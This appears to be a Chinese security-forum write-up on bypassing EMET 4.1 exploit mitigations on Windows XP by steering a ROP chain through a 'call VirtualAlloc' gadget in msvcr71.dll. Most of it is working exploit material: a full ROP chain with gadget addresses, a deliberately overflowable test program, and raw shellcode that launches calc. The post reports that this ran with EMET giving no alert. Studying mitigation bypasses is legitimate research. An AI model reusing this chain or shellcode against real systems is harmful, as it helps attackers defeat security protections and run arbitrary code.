
## 必须通过 `call` 指令将控制流程交给 `VirtualAlloc`/`VirtualAllocEx`

根据 Jared Demott 的《BYPASSING EMET4.1》所述，`msvcrt71.dll` 中含有如下指令，通过“`call [内存地址]`”调用 `VirtualAlloc`。

![](https://bbs.kanxue.com/upload/attach/201405/247015_oigm06lr81d2g08.png)

由此作为绕过 rop 的核心方法，该方法可绕过 `caller`、`simexecflow`（`7c34A464` 处的 `jnz` 跳转指令结束该检测）、`memprot`、`stackpivot`，`Shellcode` 的实现不通过 UNC path 加载 `dll` 即可绕过 `LoadLib`，构造 rop 链如下：

```
//阶段(0) 配合之后的指令

"\x2e\x40\x34\x7c"  //0x7c34402e :  # POP EDX # RETN    ** [msvcr71.dll]

"\x98\xb1\x38\x7c"  //0x7c38b198 ;  [edx]可写 edx = 0x7c38b198

"\x13\x40\x37\x7c"  //0x7c374013 :  # POP EBP # RETN    ** [msvcr71.dll] **

"\x98\xb1\x38\x7c"  //0x7c38b198 ;  [ebp]可读 ebp = 0x7c38b198

//阶段(1) edx<--eax<--esi<--esp，edx准备作为VirtualAlloc的第一个参数

"\x4f\x2f\x37\x7c"  //0x7c372f4f :  # PUSH ESP # AND AL,10 # MOV DWORD PTR DS:[EDX],ECX # POP ESI # RETN

"\x38\x05\x35\x7c"  //0x7c350538 :  # MOV EAX,ESI # POP ESI # RETN

"\x00\x00\x00\x00"  //0x00000000 :  esi = 0

"\xc6\x09\x36\x7c"  //0x7c3609c6 :  # MOV EDX,EAX 
          //      # SUB EDX,ESI # MOV DWORD PTR DS:[EDX-4],ECX 
          //      # POP EDI # POP ESI # POP EBX 
          //      # RETN

"\x41\x41\x41\x41"  //0x41414141 :  占位   edi = 0x41414141

"\x98\xb1\x38\x7c"  //0x7c38b198 :  [esi]可写  esi = 0x7c38b198

"\x41\x41\x41\x41"  //0x41414141 :  占位   ebx = 0x41414141

//(2)ecx<--0x7c34a459

"\x19\xc0\x36\x7c"  //0x7c36c019 :  # POP ECX # RETN  ecx = 0x7c34a459

"\x59\xa4\x34\x7c"  //0x7c34a459,  # "call VirtualAlloc"

//阶段(3) 布置VirtualAlloc的参数

"\xce\x25\x34\x7c"  //0x7c3425ce :  # PUSH EDX # OR AL,39 //edx=第一个参数
          //      # PUSH ECX # OR BYTE PTR SS:[EBP+5],DH # MOV EAX,1 
          //      # RETN    ** [msvcr71.dll] **   |   {PAGE_EXECUTE_READ}

"\x00\x02\x00\x00"  //0x00000200,  # dwsize

"\x00\x10\x00\x00"  //0x00001000,  # flAllocationType

"\x40\x00\x00\x00"  //0x00000040,  # flProtect

"\x41\x41\x41\x41"  //0x41414141,  # junk

"\x42\x42\x42\x42"  //0x42424242,  # junk

"\x30\x5c\x34\x7c";  //0x7c345c30,  # ptr to 'push esp # ret ' [msvcr71.dll] 之后跟shellcode
```

考虑到阶段(1)，阶段(3)的 rop 指令会用到向 `[EDX]`,`[EBP]` 里面读写内容，所以阶段(0)指令使得 `[EDX]`,`[EBP]` 可读写

```
"\x2e\x40\x34\x7c"  //0x7c34402e :  # POP EDX # RETN    ** [msvcr71.dll]

"\x98\xb1\x38\x7c"  //0x7c38b198 ;  [edx]可写 edx = 0x7c38b198

"\x13\x40\x37\x7c"  //0x7c374013 :  # POP EBP # RETN    ** [msvcr71.dll] **

"\x98\xb1\x38\x7c"  //0x7c38b198 ;  [ebp]可读 ebp = 0x7c38b198
```

阶段(1)使得 `esp` 的值间接传给 `edx`，而 `edx` 在阶段(3)成为 `VirtualAlloc` 的第一个参数。另外又

考虑到在调用 `VirtualAlloc` 返回之后（`7C34A45F`）开始，直到（`7C34A491`）`retn` 指令，如下：

```
7C34A459       FF15 94A0377C   call    dword ptr [7C37A094]    ; kernel32.VirtualAlloc

7C34A45F       3BC7            cmp     eax, edi

7C34A461       8946 0C         mov     dword ptr [esi+C], eax

7C34A464       75 12           jnz     short 7C34A478

…

7C34A478      834E 08 FF      or      dword ptr [esi+8], FFFFFFFF

7C34A47C      893E            mov     dword ptr [esi], edi

7C34A47E      897E 04         mov     dword ptr [esi+4], edi

7C34A481      FF05 F417397C   inc     dword ptr [7C3917F4]

7C34A487      8B46 10         mov     eax, dword ptr [esi+10]

7C34A48A      8308 FF         or      dword ptr [eax], FFFFFFFF

7C34A48D      8BC6           mov     eax, esi

7C34A48F      5E              pop     esi

7C34A490      5F              pop     edi

7C34A491      C3              retn
```

会涉及到 `[esi]`、`[esi+4]`、`[esi+8]`、`[esi+C]`、`[esi+10]` 的读写操作，所以阶段(1)如下的指令使 `[esi]` 可读写。

```
"\xc6\x09\x36\x7c"  //0x7c3609c6 :  # MOV EDX,EAX 
        //      # SUB EDX,ESI # MOV DWORD PTR DS:[EDX-4],ECX 
        //      # POP EDI # POP ESI # POP EBX 
        //      # RETN

"\x41\x41\x41\x41"  //0x41414141 :  占位   edi = 0x41414141

"\x98\xb1\x38\x7c"  //0x7c38b198 :  [esi]可读写  esi = 0x7c38b198
```

### 测试实例

测试程序：具有缓冲区溢出的程序

测试系统：`windows xp sp3 chs`

测试目标 `dll`：`msvcr71.dll`

```c
void func()
{
  char buf[8];
  //绕过rop防御机制
  memcpy(buf, rop_chain4, sizeof(rop_chain4) - 1);
  memcpy(buf+sizeof(rop_chain4) - 1, shellcode1, sizeof(shellcode1)-1);
}

int _tmain(int argc, _TCHAR* argv[])
{
  char buff[400];
  memset(buff, 0, 400);
  LoadLibrary("msvcr71.dll");
  func();
  getchar();
  return 0;
}
```

Rop 链

```c
char rop_chain4[]=
//(0)
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //填充buffer
"\x2e\x40\x34\x7c"  //0x7c34402e :  # POP EDX # RETN    ** [msvcr71.dll]
"\x98\xb1\x38\x7c"  //0x7c38b198 ; [edx]可写 edx = 0x7c38b198
"\x13\x40\x37\x7c"  //0x7c374013 :  # POP EBP # RETN    ** [msvcr71.dll] **
"\x98\xb1\x38\x7c"  //0x7c38b198 ; [ebp]可写 ebp = 0x7c38b198
//(1)edx<--eax<--esi<--esp
"\x4f\x2f\x37\x7c"  //0x7c372f4f :  # PUSH ESP # AND AL,10 # MOV DWORD PTR DS:[EDX],ECX # POP ESI # RETN
"\x38\x05\x35\x7c"  //0x7c350538 :  # MOV EAX,ESI # POP ESI # RETN
"\x00\x00\x00\x00"  //0x00000000 :  esi = 0
"\xc6\x09\x36\x7c"  //0x7c3609c6 :  # MOV EDX,EAX 
          //    # SUB EDX,ESI # MOV DWORD PTR DS:[EDX-4],ECX 
          //    # POP EDI # POP ESI # POP EBX 
          //    # RETN
"\x41\x41\x41\x41"  //0x41414141 :  占位   edi = 0x41414141
"\x98\xb1\x38\x7c"  //0x7c38b198 :  [esi]可写 esi = 0x7c38b198
"\x41\x41\x41\x41"  //0x41414141 :  占位   ebx = 0x41414141
//(2)ecx<--0x7c34a459
"\x19\xc0\x36\x7c"  //0x7c36c019 :  # POP ECX # RETN  ecx = 0x7c34a459
"\x59\xa4\x34\x7c"  //0x7c34a459,  # "call VirtualAlloc"
//(3)  
"\xce\x25\x34\x7c"  //0x7c3425ce :  # PUSH EDX # OR AL,39 
          //    # PUSH ECX # OR BYTE PTR SS:[EBP+5],DH # MOV EAX,1 
          //    # RETN    ** [msvcr71.dll] **   |   {PAGE_EXECUTE_READ}
"\x00\x02\x00\x00"  //0x00000200,  # dwsize
"\x00\x10\x00\x00"  //0x00001000,  # flAllocationType
"\x40\x00\x00\x00"  //0x00000040,  # flProtect
"\x41\x41\x41\x41"  //0x41414141,  # junk
"\x42\x42\x42\x42"  //0x42424242,  # junk
"\x30\x5c\x34\x7c";  //0x7c345c30,  # ptr to 'push esp # ret ' [msvcr71.dll] 之后跟shellcode
```

Shellcode //弹出 calc

```c
unsigned char shellcode1[227] = {
  0xE9, 0x9E, 0x00, 0x00, 0x00, 0x56, 0x31, 0xC0, 0x64, 0x8B, 0x40, 0x30, 0x85, 0xC0, 0x78, 0x0F, 
  0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0xAD, 0x8B, 0x40, 0x08, 0xE9, 0x09, 0x00, 0x00, 0x00, 0x8B, 
  0x40, 0x34, 0x8D, 0x40, 0x7C, 0x8B, 0x40, 0x3C, 0x5E, 0xC3, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 
  0x45, 0x3C, 0x8B, 0x54, 0x05, 0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 
  0xE3, 0x37, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31, 0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 
  0x74, 0x0A, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE9, 0xF1, 0xFF, 0xFF, 0xFF, 0x3B, 0x7C, 0x24, 0x28, 
  0x75, 0xDE, 0x8B, 0x5A, 0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x5A, 0x1C, 0x01, 0xEB, 
  0x8B, 0x04, 0x8B, 0x01, 0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xAD, 0x50, 0x52, 0xE8, 0xA7, 
  0xFF, 0xFF, 0xFF, 0x89, 0x07, 0x81, 0xC4, 0x08, 0x00, 0x00, 0x00, 0x81, 0xC7, 0x04, 0x00, 0x00, 
  0x00, 0x39, 0xCE, 0x75, 0xE6, 0xC3, 0xE8, 0x19, 0x00, 0x00, 0x00, 0x98, 0xFE, 0x8A, 0x0E, 0x7E, 
  0xD8, 0xE2, 0x73, 0x81, 0xEC, 0x08, 0x00, 0x00, 0x00, 0x89, 0xE5, 0xE8, 0x55, 0xFF, 0xFF, 0xFF, 
  0x89, 0xC2, 0xEB, 0xE2, 0x5E, 0x8D, 0x7D, 0x04, 0x89, 0xF1, 0x81, 0xC1, 0x08, 0x00, 0x00, 0x00, 
  0xE8, 0xB6, 0xFF, 0xFF, 0xFF, 0xEB, 0x0E, 0x5B, 0x31, 0xC0, 0x50, 0x53, 0xFF, 0x55, 0x04, 0x31, 
  0xC0, 0x50, 0xFF, 0x55, 0x08, 0xE8, 0xED, 0xFF, 0xFF, 0xFF, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 
  0x78, 0x65, 0x00
};
```

开启 dep 及所有 rop 保护：

![](https://bbs.kanxue.com/upload/attach/201405/247015_6ufo2rbv0n3wst1.png)

执行测试程序，shellcode 执行成功，且 `emet4.1` 无报警。

![](https://bbs.kanxue.com/upload/attach/201405/247015_c77u8jntd5zguz2.png)

![](https://bbs.kanxue.com/upload/attach/201405/247015_ye4dh2w7migjozs.png)

### 部分参考内容

[1] 961K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0r3j5X3I4#2k6h3S2S2N6s2m8J5K9i4A6W2i4K6u0r3

[2] 759K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3c8W2i4K6u0W2k6$3!0G2k6$3I4W2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8Y4u0G2M7r3N6#2j5i4u0V1i4K6u0r3
